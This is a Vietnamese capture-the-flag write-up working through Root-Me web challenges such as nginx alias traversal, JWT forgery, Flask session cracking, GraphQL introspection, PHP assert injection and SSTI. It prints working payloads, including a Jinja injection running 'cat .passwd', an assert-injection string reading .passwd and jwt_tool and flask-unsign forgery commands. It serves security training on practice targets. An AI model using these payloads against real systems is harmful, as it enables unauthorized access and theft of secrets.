# Insecure Code Management
Dùng dirseach thì mình tìm thấy file .git

![image](https://github.com/user-attachments/assets/0b70f809-84eb-47d1-bd8e-be470fe6cc83)

![image-1](https://github.com/user-attachments/assets/bb3d1444-457d-428a-a6e2-893c7c829edd)

Dùng wget -r `<url>` để tải src về

Use git show to check for git commit change
![image-2](https://github.com/user-attachments/assets/ac9bb50b-0349-4afe-a601-08f5f564f0d7)

# files install 

![image-4](https://github.com/user-attachments/assets/303b0e4e-717d-49c7-abd5-1e69fd8a6d97)

![image-5](https://github.com/user-attachments/assets/2e3bfb49-fff9-443b-ac2e-a1bdf820061e)

![image-6](https://github.com/user-attachments/assets/5b5ce823-80de-455d-9b17-83a083c613fb)

![image-3](https://github.com/user-attachments/assets/28248483-2f92-4bc1-a858-cbf90f62549f)

# file upload -mime type

![image-8](https://github.com/user-attachments/assets/f175642f-831c-47d1-b268-cf27ad09fca3)


![image-7](https://github.com/user-attachments/assets/e7d1b12f-4abe-43dc-bb57-5689a95c8057)

# file upload double extenions

Dùng a.php.png

![image-9](https://github.com/user-attachments/assets/019c2f0e-21ee-4b3d-af10-254dee93dc97)

# HTTP - Improper redirect

Truy cập vào thẳng index xem trong Burp sẽ thấy được

Có vẻ như nếu redirect mà không exit thì code ở phía dưới nếu có vẫn sẽ được thực thi

![image-10](https://github.com/user-attachments/assets/f6c528a0-1560-4ff5-8f58-2b5610f5268d)

# Nginx - Alias Misconfiguration

**Một chút lý thuyết:**

Directive alias dùng để thay thế đường dẫn của một location nhất định. Ví dụ:

```nginx
location /i/ {
    alias /data/w3/images/;
}
```

- Khi người dùng yêu cầu /i/top.gif, Nginx sẽ trả về file /data/w3/images/top.gif.
- location kết thúc bằng dấu /, nên các yêu cầu bên trong /i/ sẽ chỉ ánh xạ vào /data/w3/images/.

Lỗi xảy ra khi không có dấu /
Nếu cấu hình như sau:

```nginx
location /i {
    alias /data/w3/images/;
}
```
- Khi người dùng yêu cầu /i/top.gif, Nginx load file /data/w3/images/top.gif
- Nếu kẻ tấn công yêu cầu /i../app/config.py, đường dẫn sẽ bị ánh xạ thành:
```nginx
/data/w3/images/../app/config.py → /data/w3/app/config.py
```
Điều này có nghĩa là file config.py nằm ngoài thư mục /data/w3/images/ nhưng vẫn bị lộ.

[Ref Link](https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md)

**Khai thác:** Từ lỗi misconfiguration ở trên ta có thể lợi dụng thể path traversal.

Đầu tiên khi vào link challenge thì không có gì đặc biệt, tuy nhiên khi mình vào Burp để xem request thì thấy 1 file main.js, mà nó còn show code cho mình nữa.

![image-11](https://github.com/user-attachments/assets/e3f4bd73-ae40-4fc5-ab51-40affeb0b78c)

Với kiến thức đã đọc được ở trên thì mình thử tấn công, đầu tiên hiện tại file mình muốn đọc không phải là `main.js` nữa, có thể là một file nào đó khác và với đặc thù của path traversal thì cứ `../` tới chết.

![image-12](https://github.com/user-attachments/assets/e2d3f2e0-295e-4e60-94cf-618927c02fbe)

Có vẻ mình đã đúng hướng.

![image-13](https://github.com/user-attachments/assets/da2966c7-d188-41f8-8909-f9e4cb133e6a)

Tới đây thì có hint luôn thêm `/assets` vào.

![image-14](https://github.com/user-attachments/assets/51dcf10e-72ef-4495-ad3e-d8786e400192)

Tới đây thì thấy cả folder ngoài cùng rồi và cả flag.

![image-15](https://github.com/user-attachments/assets/4faa3431-1851-46e9-82a8-106e20f26f70)

# Verb tampering

Bài này thì mình thấy khác là chơi chữ tampering có nghĩa là giả mạo, chỉ cần thay đổi http method trừ get và post là sẽ đọc được flag

![image-16](https://github.com/user-attachments/assets/2a4c0d6e-7d8d-433f-b830-a997cdd56ed6)

# CRLF

![image-17](https://github.com/user-attachments/assets/2f3b0cb9-e02b-43a9-921e-0cfe16cfdda6)

# Flask - Unsecure session

Bài này thì mình nhận được một jwt hơi lạ

![image-18](https://github.com/user-attachments/assets/6e15c0c0-0993-43f7-8ee4-0531c9f3bce8)

Bình thường thì một jwt token sẽ gồm

**Header.Payload.Signature**

    Header: Chứa thuật toán
    Payload: Chứa thông tin user
    Signature: Hash của 2 cái trên với key

Tuy nhiên với bài này thì cái payload lại nằm ở đầu, sau đó mình xem được [Video](https://www.youtube.com/watch?v=-ApYZewPLNQ) này, nhưng cũng chưa được giải thích rõ lắm.

**Command:**`flask-unsign --wordlist rockyou.txt --unsign --cookie 'eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.Z7FU8g.3SnSsOXWN4smUAbxs-Ez9oYz4nM' --no-literal-eval`

![image-19](https://github.com/user-attachments/assets/244ed7aa-6eef-4871-965b-4cc536ba9285)

Sau đó thì thay payload của mình vào rồi tạo token lại thôi

**Command**`flask-unsign --sign --cookie '{"admin": "true", "username" : "admin"}' --secret 's3cr3t'`
![image-21](https://github.com/user-attachments/assets/361839d4-07e2-40d9-88d9-30fb3bb8a938)

![image-20](https://github.com/user-attachments/assets/af126433-9476-4655-bfe8-35fbce02530d)

# GraphQL instropection
Sau một hồi tìm hiểu về GraphQL thì mình thấy trang [graphql-voyager](https://graphql-kit.com/graphql-voyager/)

Trang này chủ yếu dùng dữ liệu trả về của GraphQL query để vẽ biểu đồ quan hệ

![image-22](https://github.com/user-attachments/assets/275e4f74-00dd-4a9c-86a7-555855617990)

Sau đó thì thấy cái này mình dùng thử thì được query như sau:
```json
{"query":"{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}}"}
```

Sau khi dùng query trên thì mình nhận về 1 chuỗi data json dài vcl

![image-24](https://github.com/user-attachments/assets/a517f728-9987-4275-980a-f0ac8750241d)

Nhưng xài [graphql-voyager](https://graphql-kit.com/graphql-voyager/) thì nhìn cũng dễ hiểu rồi

![image-23](https://github.com/user-attachments/assets/f7bd507f-2d33-4632-b0d0-7bd92b387b67)

Sau đó dễ dàng nhận ra là bảng `IAmNotHere` chính là nơi ta cần khai thác

Đầu tiên mình sẽ tạo một câu query đơn giản theo biểu đồ sau:

```graphql
query {
  IAmNotHere {
    very_long_id
    very_long_value
  }
}
```

Sau đó dùng [datafetcher](https://datafetcher.com/graphql-json-body-converter) để đổi query thuần sang json

```json
{
  "query": "query { IAmNotHere { very_long_id very_long_value }}"
}
```

![image-25](https://github.com/user-attachments/assets/29208450-4f57-44e5-9132-de9aec90bb5d)

OK từ đây ta biết được dòng very_long_id cần phải truyền giá trị vào

![image-26](https://github.com/user-attachments/assets/93701025-9eb4-4245-afae-e3e27f01956b)

Vậy từ đây ta biết được rằng có lẽ flag được giấu trong các id này, bây giờ một là dùng tay, hai là intruder thôi

![image-27](https://github.com/user-attachments/assets/6fba6865-bb69-4d90-8872-b3eb3802c35b)

Sau khi dùng intruder để dò thử thì ở id 17 ta sẽ lấy được flag


# HTTP - cookies

Bài này lúc nào mình thấy không có gì để tương tác trên web lắm vào đọc src thì thấy cái này. Khi dùng chức năng save mail thì nó đòi mình là admin

![image-28](https://github.com/user-attachments/assets/2d148b44-3534-47dc-91c6-9f4af1b28661)

Nên mình vào cookie editor sửa lại rồi save mail lần nữa là được

![image-29](https://github.com/user-attachments/assets/d2715bf0-51af-435f-80c1-7c909df3302f)

![image-30](https://github.com/user-attachments/assets/dcf1fdf1-4bf2-4e55-a164-3e3ea60f0de3)

# JWT Introduction

Bài này khá đơn giản, chỉ cần thay username và alg là lấy được flag

![image-31](https://github.com/user-attachments/assets/beaa654e-8d7a-4d0a-99f2-10e0a3bf2639)

# Directory Traversal 

![image-32](https://github.com/user-attachments/assets/e8c3d4e7-081c-4e18-8aea-321d56c873fb)

vào trang web có param galerie để query tới các ảnh, nói chung bài này mình chỉ thử sai thôi chứ cũng không có idea gì.

![image-33](https://github.com/user-attachments/assets/b899cae3-4196-44e4-be57-ba89ac6222ed)

Có giá trị `86hwnX2r` thì mình thử quăng vô thôi 
![image-34](https://github.com/user-attachments/assets/9430cb93-6db6-4b5f-9e36-7820ab7113fc)

![image-35](https://github.com/user-attachments/assets/fa17b93e-607f-457c-b53d-a2766a1906f9)

![image-36](https://github.com/user-attachments/assets/a9e7b4a2-f23a-4ef1-aded-14fb53f98c49)

# File upload - Null byte

upload file php có dạng a.php%00.png thì sẽ qua sau đó vào file thì có flag

# JWT - revoked token

```python
    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-
    from flask import Flask, request, jsonify
    from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
    import datetime
    #from apscheduler.schedulers.background import BackgroundScheduler
    import threading
    import jwt
    from config import *
     
    # Setup flask
    app = Flask(__name__)
     
    app.config['JWT_SECRET_KEY'] = SECRET
    jwtmanager = JWTManager(app)
    blacklist = set()
    lock = threading.Lock()
     
    # Free memory from expired tokens, as they are no longer useful
    def delete_expired_tokens():
        with lock:
            to_remove = set()
            global blacklist
            for access_token in blacklist:
                try:
                    jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
                except:
                    to_remove.add(access_token)
           
            blacklist = blacklist.difference(to_remove)
     
    @app.route("/web-serveur/ch63/")
    def index():
        return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
     
    # Standard login endpoint
    @app.route('/web-serveur/ch63/login', methods=['POST'])
    def login():
        try:
            username = request.json.get('username', None)
            password = request.json.get('password', None)
        except:
            return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
     
        if username != 'admin' or password != 'admin':
            return jsonify({"msg": "Bad username or password"}), 401
     
        access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
        ret = {
            'access_token': access_token,
        }
       
        with lock:
            blacklist.add(access_token)
     
        return jsonify(ret), 200
     
    # Standard admin endpoint
    @app.route('/web-serveur/ch63/admin', methods=['GET'])
    @jwt_required
    def protected():
        access_token = request.headers.get("Authorization").split()[1]
        with lock:
            if access_token in blacklist:
                return jsonify({"msg":"Token is revoked"})
            else:
                return jsonify({'Congratzzzz!!!_flag:': FLAG})
     
     
    if __name__ == '__main__':
        scheduler = BackgroundScheduler()
        job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
        scheduler.start()
        app.run(debug=False, host='0.0.0.0', port=5000)
```

Bài này thì yêu cầu mình vào trang admin với JWT được tạo ở trên, nhưng ngặt nổi là token vừa tạo là vô blacklist luôn. Sau một hồi loay hoay thì mình có đi xin tí hint: **Có phải base64 lúc nào cũng kết thúc bởi dấu = không?**

Đây là [Post](https://stackoverflow.com/questions/6916805/why-does-a-base64-encoded-string-have-an-sign-at-the-end) mà mình đã đọc được trên stackoverflow giải thích khá rõ, về căn bản thì mỗi lần base64 decode nó sẽ chia cụm mỗi cụm 3 kí tự, nếu như thiếu thì nó sẽ padding thêm, mỗi kí tự thiếu là một dấu `=`

    abcdef => YWJjZGVm
    abcde  => YWJjZGU=
  
Vậy theo logic này thì `YWJjZGU=` = `YWJjZGU==` = `YWJjZGU`

Tiếp tục với bài làm thì khi mình vào /login thì không có giao diện để login nên mình dùng curl

```bash
curl -k -x http://127.0.0.1:8080 -X POST "http://challenge01.root-me.org/web-serveur/ch63/login" \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"admin"}'
```

Hoặc Burp

![image-37](https://github.com/user-attachments/assets/47855ec9-18fc-4951-93e7-a27ab2bc5aa7)

Burp có chức năng đổi từ `GET` thành `POST` request sau đó chỉ cần đổi content type và `POST` data là được.

Sau khi dùng token thì đúng như khi phân tích code nó đã expire
![image-38](https://github.com/user-attachments/assets/2f142721-5904-4d96-b93b-e2ff9486749d)

![image-39](https://github.com/user-attachments/assets/2064e152-f2ab-4efc-b991-4f95ae5f9812)

Sau đó mình thêm dấu = đằng sau thì đã lấy được flag

**Lưu ý:** làm trong khoảng 3 phút nếu thôi nó sẽ expire, mình nghĩ viết code python sẽ ok hơn


# JWT - Weak Secret

**Command:**`python3 jwt_tool.py <jwt_token> -C -d <wordlist>`

Với secret mình dùng 1 đoạn python để tạo ra token
```python
import jwt; print(jwt.encode({"role": "admin"}, "lol", algorithm="HS512", headers={"typ": "JWT", "alg": "HS512"}))

```

![image-40](https://github.com/user-attachments/assets/e6b53195-7dd8-4822-8aa9-6c919a96c112)

![image-41](https://github.com/user-attachments/assets/fe297c20-e7df-4558-941f-bac5e6e46a0c)

# JWT - Unsecure File Signature

Ở bài này đầu tiên dạo 1 vòng quanh web thì phát hiện endpoint này

![image-42](https://github.com/user-attachments/assets/4ddb80a4-89f1-4cd6-85bd-b497a27b5560)

Trong chuỗi jwt này thì có thêm 2 giá trị mới đó là kid, iat 

![image-43](https://github.com/user-attachments/assets/3fdbf7f6-14a2-44af-bcc9-f5bf3fbc1a22)

Sau khi tìm hiểu thì `iat - issued at` và `kid - key id`.
- iat để xác định thời gian token được kí 
- [kid](https://www.rfc-editor.org/rfc/rfc7515#section-4.1.4) để xác định là hệ thống sẽ dùng key nào để kí trong trường hợp có nhiều key

Với cách sử dụng của kid thì trong [Hacktricks](https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html?highlight=kid#kid-issues-overview) có đề cập tới bị các vấn đề như path traversal, os command injeciton, SQLi,...

![image-44](https://github.com/user-attachments/assets/62446960-678e-4303-bf1d-691aa2812908)

Đầu tiên mình thử path traversal có vẻ dính rồi mà bị filter

![image-45](https://github.com/user-attachments/assets/13a2ccb0-29f7-4eb9-aa6b-83cb2fc964f5)

Tới đây thì có vẻ bypass được rồi nhưng mà mình thử lùi về tiếp thì bị báo không đúng signature. Không lẻ giờ đi bruteforce key

![image-46](https://github.com/user-attachments/assets/78ddc1a5-84b3-4f1e-b5c3-eb2b01ce8ad1)

Cuối cùng thì ChatGPT lại là vị cứu tinh thật ra mình tưởng chỉ cần trỏ với null thì đã là rỗng rồi nhưng mà phải kí bằng key rỗng nữa.

![image-47](https://github.com/user-attachments/assets/3d879be6-b2ba-473a-a7de-230e95a5e1a0)

Về cái này thì có thể dùng jwt tool hay jwt editor trong Burp cũng được

    python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

![image-48](https://github.com/user-attachments/assets/73c2f645-49e4-4511-b123-9e17732d187c)

Kí xong rồi send request lại thôi

![image-49](https://github.com/user-attachments/assets/adcd26cc-ae1c-4f95-b9d5-3d796c2dfca2)

# PHP - assert

[Tài liệu tham khảo](https://www.linkedin.com/pulse/php-assert-vulnerable-local-file-inclusion-mohamed-fakroud)

Sau khi đọc xong và thử với trang của đề bài thì mình đoán được đoạn code như sau

```php
assert("strpos('includes/'. $page, '..') === false") or die("Detected hacking attempt!");
```

Nhưng mà nối chuỗi thì mình hoàn toàn kiểm soát được bây giờ chỉ là escape ra như nào thôi

Sau khi mò một hồi thì payload của mình như này

![image-51](https://github.com/user-attachments/assets/d0a78c45-8248-4898-9969-b1a63eec07c6)

```html
?page=', '') || readfile('.passwd') ; //
```
```php
strpos('includes/','');
```

Đầu tiên mình sẽ đóng hàm `strpos` lại và cho nó so sánh với chuỗi rỗng, sau đó dùng toán tử logic để nối thêm như trong blog thôi. Trong blog dùng && nhưng mà nếu ta escape như vậy thì đoạn code sau sẽ không chạy

![image-52](https://github.com/user-attachments/assets/e1136946-9b64-4492-b5ec-3de0c07e1d11)

Bởi đằng trước đã false rồi còn `and` thêm nữa cũng false thôi, còn đằng sau thì bạn xài hàm gì cx được chỉ cần đọc được file.

# PHP - Apache configuration

Bài này khá rõ ràng rồi up đè file .htaccess để chạy code php thôi

# PHP - Filters

[php-filters](https://whitehatinstitute.com/local-file-inclusion-using-php-filter-base64-encoding/)

Bài này chủ yếu xài wrapper `php://` để đọc file thôi

![image-53](https://github.com/user-attachments/assets/5c424673-5d87-47c8-ab34-f89cfadfdcd4)

Giả sử như ở đây mình đọc file `login.php` thì chỉ cần decode ra là đọc được

![image-54](https://github.com/user-attachments/assets/eb7185ed-3741-46b6-8c30-0bd38e62e0de)

Tới đây có vẻ chỉ cần đọc file config là được

![image-55](https://github.com/user-attachments/assets/151beb39-ea7b-4a0d-b931-86f78cbee147)

# PHP - register globals

Bài này nhìn tên đã biết là về register_globals, về cơ bản nếu bật cái này lên thì tất cả user input sẽ trở thành biến toàn cục
=> Nếu biết tên biến trong code thì sẽ ghi đè được luôn

Cơ bản thì bài này mình chả biết cái biến đó tên gì đọc được [bài](https://stackoverflow.com/questions/21368051/register-globals-exploit-session-array) này mình thử cái ăn
Nói chung khá rùa chả học được gì lắm

![image-56](https://github.com/user-attachments/assets/c8ca263f-25be-4581-999d-74baaa3e6654)

Uầy giải xong rồi mới đọc là có backup.

![image-57](https://github.com/user-attachments/assets/4fec2943-a224-46df-937e-13476e9bc405)

Về ý tưởng thì cài file này y chang như bài viết mình đọc.

# PHP - remote xdebug

[Tham khảo](https://bugs.php.net/bug.php?id=76149)
# Python - Server-side Template Injection Introduction

Bài này thì là ssti đơn giản thôi

![image-58](https://github.com/user-attachments/assets/d6f7e837-bf01-4019-8a29-14cc2092ce04)

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat .passwd').read().replace("\n", " ") }}

